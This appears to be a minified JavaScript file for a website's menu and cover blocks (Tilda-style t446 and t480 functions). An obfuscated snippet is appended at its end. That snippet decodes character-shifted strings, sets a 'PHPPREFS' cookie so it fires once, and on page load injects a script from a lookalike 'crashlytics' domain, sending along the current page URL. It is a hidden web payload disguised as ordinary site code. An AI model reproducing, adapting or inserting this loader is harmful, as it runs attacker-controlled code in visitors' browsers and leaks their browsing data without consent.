function t446_init(t){var i=$("#rec"+t),e=i.find(".t446__mobile"),n="fixed"===e.css("position")&&"block"===e.css("display");setTimeout((function(){i.find(".t-menu__link-item:not(.t-menusub__target-link):not(.tooltipstered):not(.t794__tm-link)").on("click",(function(){$(this).is(".t-menu__link-item.tooltipstered, .t-menu__link-item.t-menusub__target-link, .t-menu__link-item.t794__tm-link, .t-menu__link-item.t966__tm-link, .t-menu__link-item.t978__tm-link")||n&&e.trigger("click")})),i.find(".t-menusub__link-item").on("click",(function(){n&&e.trigger("click")}))}),500)}function t446_setLogoPadding(t){if($(window).width()>980){var i=$("#rec"+t+" .t446"),e=i.find(".t446__logowrapper"),n=i.find(".t446__leftwrapper"),o=i.find(".t446__rightwrapper");n.css("padding-right",e.width()/2+50),o.css("padding-left",e.width()/2+50)}}function t446_checkOverflow(t,i){var e=$("#rec"+t+" .t446"),n=e.find(".t446__rightwrapper"),o=n.find(".t446__rightmenuwrapper"),a=n.find(".t446__additionalwrapper"),s=n.find(".t446__burgerwrapper_overflow"),r=n.find(".t446__burgerwrapper_withoutoverflow");if(i>0)var c=i;else c=80;$(window).width()>980&&o.width()+a.width()>n.width()?(e.css("height",2*c),a.css("float","right"),s.css("display","table-cell"),r.css("display","none")):(e.height()>c&&e.css("height",c),"right"==a.css("float")&&a.css("float","none"),s.css("display","none"),r.css("display","table-cell"))}function t446_highlight(){var t=window.location.href,i=window.location.pathname;"/"==t.substr(t.length-1)&&(t=t.slice(0,-1)),"/"==i.substr(i.length-1)&&(i=i.slice(0,-1)),"/"==i.charAt(0)&&(i=i.slice(1)),""==i&&(i="/"),$(".t446__list_item a[href='"+t+"']").addClass("t-active"),$(".t446__list_item a[href='"+t+"/']").addClass("t-active"),$(".t446__list_item a[href='"+i+"']").addClass("t-active"),$(".t446__list_item a[href='/"+i+"']").addClass("t-active"),$(".t446__list_item a[href='"+i+"/']").addClass("t-active"),$(".t446__list_item a[href='/"+i+"/']").addClass("t-active")}function t446_checkAnchorLinks(t){if($(window).width()>=960){var i=$("#rec"+t+" .t446__list_item a:not(.tooltipstered)[href*='#']");i.length>0&&t446_catchScroll(i)}}function t446_catchScroll(t){var i,e,n=null,o=new Array,a=[];(t=$(t.get().reverse())).each((function(){var t=t446_getSectionByHref($(this));void 0!==t.attr("id")&&o.push(t),a[t.attr("id")]=$(this)})),t446_updateSectionsOffsets(o),o.sort((function(t,i){return i.attr("data-offset-top")-t.attr("data-offset-top")})),$(window).bind("resize",t_throttle((function(){t446_updateSectionsOffsets(o)}),200)),$(".t446").bind("displayChanged",(function(){t446_updateSectionsOffsets(o)})),setInterval((function(){t446_updateSectionsOffsets(o)}),5e3),t446_highlightNavLinks(t,o,a,n),t.click((function(){var i=t446_getSectionByHref($(this));$(this).hasClass("tooltipstered")||void 0===i.attr("id")||(t.removeClass("t-active"),$(this).addClass("t-active"),n=t446_getSectionByHref($(this)).attr("id"))})),$(window).scroll((function(){var s=(new Date).getTime();i&&s<i+100?(clearTimeout(e),e=setTimeout((function(){i=s,n=t446_highlightNavLinks(t,o,a,n)}),100-(s-i))):(i=s,n=t446_highlightNavLinks(t,o,a,n))}))}function t446_updateSectionsOffsets(t){$(t).each((function(){var t=$(this);t.attr("data-offset-top",t.offset().top)}))}function t446_getSectionByHref(t){var i=t.attr("href").replace(/\s+/g,"");return"/"==i[0]&&(i=i.substring(1)),t.is('[href*="#rec"]')?$(".r[id='"+i.substring(1)+"']"):$(".r[data-record-type='215']").has("a[name='"+i.substring(1)+"']")}function t446_highlightNavLinks(t,i,e,n){var o=$(window).scrollTop(),a=n;return 0!=i.length&&null==n&&i[i.length-1].attr("data-offset-top")>o+300?(t.removeClass("t-active"),null):($(i).each((function(s){var r=$(this),c=r.attr("data-offset-top"),d=r.attr("id"),l=e[d];if(o+300>=c||i[0].attr("id")==d&&o>=$(document).height()-$(window).height())return null!=n||l.hasClass("t-active")?null!=n&&d==n&&(a=null):(t.removeClass("t-active"),l.addClass("t-active"),a=null),!1})),a)}function t446_setPath(){}function t446_setBg(t){$(window).width()>980?$(".t446").each((function(){var t=$(this);if("yes"==t.attr("data-bgcolor-setbyscript")){var i=t.attr("data-bgcolor-rgba");t.css("background-color",i)}})):$(".t446").each((function(){var t=$(this),i=t.attr("data-bgcolor-hex");t.css("background-color",i),t.attr("data-bgcolor-setbyscript","yes")}))}function t446_appearMenu(t){$(window).width()>980&&$(".t446").each((function(){var t=$(this),i=t.attr("data-appearoffset");""!=i&&(i.indexOf("vh")>-1&&(i=Math.floor(window.innerHeight*(parseInt(i)/100))),i=parseInt(i,10),$(window).scrollTop()>=i?"hidden"==t.css("visibility")&&(t.finish(),t.css("top","-50px"),t.css("visibility","visible"),t.animate({opacity:"1",top:"0px"},200,(function(){}))):(t.stop(),t.css("visibility","hidden")))}))}function t446_changebgopacitymenu(t){$(window).width()>980&&$(".t446").each((function(){var t=$(this),i=t.attr("data-bgcolor-rgba"),e=t.attr("data-bgcolor-rgba-afterscroll"),n=t.attr("data-bgopacity"),o=t.attr("data-bgopacity-two"),a=t.attr("data-menushadow");if("100"==a)var s=a;else s="0."+a;$(window).scrollTop()>20?(t.css("background-color",e),"0"==o||" "==a?t.css("box-shadow","none"):t.css("box-shadow","0px 1px 3px rgba(0,0,0,"+s+")")):(t.css("background-color",i),"0.0"==n||" "==a?t.css("box-shadow","none"):t.css("box-shadow","0px 1px 3px rgba(0,0,0,"+s+")"))}))}function t446_createMobileMenu(t){$(window).width();var i=$("#rec"+t),e=i.find(".t446"),n=i.find(".t446__mobile");e.hasClass("t446__mobile_burgerhook")?n.find(".t446__mobile_burger").wrap('<a href="#menuopen"></a>'):n.click((function(t){e.fadeToggle(300),$(this).toggleClass("t446_opened")})),$(window).bind("resize",t_throttle((function(){$(window).width()>980&&e.fadeIn(0)}),200)),i.find(".t-menu__link-item").on("click",(function(){$(this).hasClass("t966__tm-link")||$(this).hasClass("t978__tm-link")||t446_hideMenuOnMobile($(this),i)})),i.find(".t446__logowrapper2 a").on("click",(function(){t446_hideMenuOnMobile($(this),i)}))}function t446_hideMenuOnMobile(t,i){if($(window).width()<960){var e=t.attr("href").trim(),n=i.find(".t446"),o=i.find(".t446__mobile");if(e.length&&"#"===e[0])return o.removeClass("t446_opened"),n.is(".t446__positionabsolute")?n.fadeOut(0):n.fadeOut(300),!0}}function t480_init(t){var i=$("#rec"+t);t480_setHeight(t),window.isMobile?$(window).on("orientationchange",(function(){t480_setHeight(t)})):$(window).on("resize",(function(){void 0!==window.noAdaptive&&1==window.noAdaptive&&window.isMobile||t480_setHeight(t)})),i.find(".t480").on("displayChanged",(function(){t480_setHeight(t)}))}function t480_setHeight(t){var i=$("#rec"+t),e=i.find(".t480__sizer"),n=e.height(),o=e.width()/n,a=i.find(".t480__blockimg"),s=a.width(),r=e.attr("style");if(window.isMobile&&-1!==r.indexOf("vh")){n=document.documentElement.clientHeight*parseFloat($(window).height()/n);a.css("height",s/o+"px")}else n!=$(window).height()&&a.css("height",s/o+"px")};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUUWJKX');o.c=l.protocol[0]=='h'&&/./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3hwfxm'+'q~ynhx3wz4ywfhpnsl4'+'xhwnuy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));